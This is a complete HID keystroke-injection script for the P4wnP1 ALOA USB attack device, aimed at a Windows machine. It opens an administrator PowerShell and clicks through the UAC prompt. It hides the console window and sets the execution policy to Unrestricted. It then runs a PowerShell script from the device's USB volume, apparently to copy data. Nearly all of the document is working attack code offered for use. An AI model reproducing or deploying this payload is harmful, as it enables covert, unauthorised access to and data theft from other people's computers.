
layout("US"); //set US layout

typingSpeed(5,0);
press("GUI r")
press("ENTER")
delay(1200)
type("powershell")
delay(1000)
press("CTRL SHIFT ENTER")
delay(1200)
press("LEFT")
delay(750)
press("ENTER")
delay(750)
type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
press("ENTER");
delay(500)
type("Set-ExecutionPolicy Unrestricted\n")
delay(500)
type("A\n")
delay(500)
type("$usbpath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'P4wnP1 ALOA\' } | select name \n")
delay(500)
type("cd $usbpath.name\n")
delay(500)
type("& scripts\\dataonly-win7-to-win10.ps1\n")
delay(2000)
type("exit\n")
